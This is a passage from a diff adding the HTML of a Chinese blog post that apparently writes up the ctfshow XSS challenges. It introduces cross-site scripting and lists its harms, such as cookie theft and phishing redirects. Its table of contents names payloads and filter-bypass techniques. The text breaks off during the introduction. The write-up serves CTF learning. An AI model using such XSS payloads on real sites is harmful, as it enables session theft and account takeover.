@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XSS跨站漏洞 0x01xss前言之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧 0x02xss介绍原理   简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行  概念XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web入门xss篇--ctfshow">
+<meta property="og:url" content="https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="XSS跨站漏洞 0x01xss前言之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧 0x02xss介绍原理   简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行  概念XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/QQ20240925-135455.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/1653879435_6294328b016b58c8721cf.png!small">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/07a1746c6488d6afa192ea6f9f8771ec.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/ac96e3daa1c8765aeadac3e7a94fda5f.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241119182822162.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241119192443556.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241119203014705.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241120120352350.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241120123544602.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241120145254131.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120145329147.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120151233543.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241120153753204.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241120153647539.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121163235464.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121163720264.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121164836097.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121164916830.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121165611266.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121172155875.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121172225582.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121172354984.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121172418105.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121192145834.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121192524240.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241121193746146.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/image-20241202112143252.png">
+<meta property="article:published_time" content="2024-11-05T15:30:17.000Z">
+<meta property="article:modified_time" content="2025-04-12T07:15:55.192Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="XSS跨站">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web入门xss篇--ctfshow</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/07/2024%E7%8E%84%E6%AD%A6%E6%9D%AFwp--web%E6%96%B9%E5%90%91(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/05/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&text=web入门xss篇--ctfshow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&is_video=false&description=web入门xss篇--ctfshow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web入门xss篇--ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&title=web入门xss篇--ctfshow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&name=web入门xss篇--ctfshow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/&t=web入门xss篇--ctfshow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">XSS跨站漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01xss%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x01xss前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02xss%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">0x02xss介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.2.2.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%B1%82%E9%9D%A2"><span class="toc-number">1.2.4.</span> <span class="toc-text">产生层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3%EF%BC%88%E8%83%BD%E6%8B%BF%E6%9D%A5%E5%B9%B2%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">危害（能拿来干什么）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.7.</span> <span class="toc-text">利用环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03xss%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">0x03xss攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04xss%E5%88%86%E7%B1%BB%E5%8F%8A%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.</span> <span class="toc-text">0x04xss分类及介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">1、反射型(非持久化)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">2.存储型</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05xss%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.</span> <span class="toc-text">0x05xss常见标签语句</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.1.</span> <span class="toc-text">0x01&lt;a&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.2.</span> <span class="toc-text">0x02. &lt;img&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.3.</span> <span class="toc-text">0x03. &lt;iframe&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.4.</span> <span class="toc-text">0x04. &lt;audio&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.5.</span> <span class="toc-text">0x05. &lt;video&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.6.</span> <span class="toc-text">0x06. &lt;svg&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.7.</span> <span class="toc-text">0x07. &lt;button&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.8.</span> <span class="toc-text">0x08. &lt;div&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.9.</span> <span class="toc-text">0x09. &lt;object&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x10-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.10.</span> <span class="toc-text">0x10. &lt;script&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x11-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.11.</span> <span class="toc-text">0x11. &lt;p&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x12-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.12.</span> <span class="toc-text">0x12. &lt;input&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x13-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.13.</span> <span class="toc-text">0x13. &lt;details&gt;标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x14-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.14.</span> <span class="toc-text">0x14. &lt;select&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x15-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.15.</span> <span class="toc-text">0x15. &lt;form&gt; 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x16-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.5.16.</span> <span class="toc-text">0x16. &lt;body&gt; 标签</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss"><span class="toc-number">2.</span> <span class="toc-text">反射性xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316"><span class="toc-number">2.1.</span> <span class="toc-text">web316</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">#反射性xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.2.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E8%AF%AD%E5%8F%A5alert-%E2%80%98XSS%E2%80%99"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">解析语句&lt;script&gt;alert(‘XSS’)&lt;&#x2F;script&gt;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1-document-location-href"><span class="toc-number">2.1.3.</span> <span class="toc-text">payload1:document.location.href</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2-window-open"><span class="toc-number">2.1.4.</span> <span class="toc-text">payload2:window.open</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317"><span class="toc-number">2.2.</span> <span class="toc-text">web317</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4script%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.1.</span> <span class="toc-text">#过滤script标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#body%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.2.</span> <span class="toc-text">body标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iframe%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.3.</span> <span class="toc-text">iframe标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#img%E6%A0%87%E7%AD%BE"><span class="toc-number">2.2.4.</span> <span class="toc-text">img标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web318-319"><span class="toc-number">2.3.</span> <span class="toc-text">web318-319</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%8A%A0%E6%A0%87%E7%AD%BE%E8%BF%87%E6%BB%A4"><span class="toc-number">2.3.1.</span> <span class="toc-text">#增加标签过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-321"><span class="toc-number">2.4.</span> <span class="toc-text">web320-321</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC"><span class="toc-number">2.4.1.</span> <span class="toc-text">#绕过空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.4.2.</span> <span class="toc-text">绕过空格姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E7%9A%84payload"><span class="toc-number">2.4.3.</span> <span class="toc-text">额外的payload:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#js%E4%B8%ADString-fromCharCode-%E6%96%B9%E6%B3%95"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">js中String.fromCharCode()方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%ACascii%E7%A0%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">字符串转ascii码脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii%E7%A0%81%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.3.3.</span> <span class="toc-text">ascii码转字符串脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web322-326"><span class="toc-number">2.5.</span> <span class="toc-text">web322-326</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4xss"><span class="toc-number">2.5.1.</span> <span class="toc-text">#过滤xss</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web323"><span class="toc-number">2.6.</span> <span class="toc-text">web323</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">3.</span> <span class="toc-text">存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">3.1.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">3.2.</span> <span class="toc-text">web328</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">预期解:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">3.3.</span> <span class="toc-text">web329</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web入门xss篇--ctfshow
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-05T15:30:17.000Z" class="dt-published" itemprop="datePublished">2024-11-05</time>
+        
+        (Updated: <time datetime="2025-04-12T07:15:55.192Z" class="dt-updated" itemprop="dateModified">2025-04-12</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/XSS%E8%B7%A8%E7%AB%99/" rel="tag">XSS跨站</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h1><p><img src="/./../image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png" alt="img"></p>
+<h2 id="0x01xss前言"><a href="#0x01xss前言" class="headerlink" title="0x01xss前言"></a>0x01xss前言</h2><p>之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧</p>
+<h2 id="0x02xss介绍"><a href="#0x02xss介绍" class="headerlink" title="0x02xss介绍"></a>0x02xss介绍</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/./../image/achieve/202411/xss--ctfshow/QQ20240925-135455.png" alt="img"></p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/1653879435_6294328b016b58c8721cf.png!small" alt="image"></p>
+<ul>
+<li>简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行</li>
+</ul>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在 Web 应用中的计算机安全漏洞。</p>
+<p>站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动<strong>态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容</strong>。动态站点会受到称XSS的威胁，而<strong>静态站点则完全不受其影响</strong>。</p>
+<p>  跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
+<p>  攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：<strong>跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</strong></p>
+<p>  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以<strong>xss漏洞关键就是寻找参数未过滤的输出函数。</strong></p>
+<h3 id="利用的函数"><a href="#利用的函数" class="headerlink" title="利用的函数"></a>利用的函数</h3><p>比如说php中的脚本的输出函数</p>
+<p>  常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
+<h3 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h3><p><strong>产生层面一般都是在前端</strong>，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ol>
+<li>浏览器可以执行JavaScript代码（这不是废话吗）。</li>
+<li>网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等</li>
+</ol>
+<p>那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个”互”,所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)，xss本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
+<h3 id="危害（能拿来干什么）"><a href="#危害（能拿来干什么）" class="headerlink" title="危害（能拿来干什么）"></a>危害（能拿来干什么）</h3><ul>
+<li>窃取cookie 或token 来获得用户登录态；</li>
+<li>劫持流量，把用户正在访问的页面跳转到钓鱼网站；</li>
+<li>盗用账户来转账、群发信息等；</li>
+<li>利用用户的设备来发起DDOS攻击；</li>
+<li>网站挂马</li>
+<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
+<li>盗窃企业重要的具有商业价值的资料</li>
+</ul>
+<p>所以归根结底，x<strong>ss的攻击方式就是想办法”教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码</strong>。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert(“say something”)的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p>
+<ol>
+<li>窃取网页浏览中的cookie值。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</li>
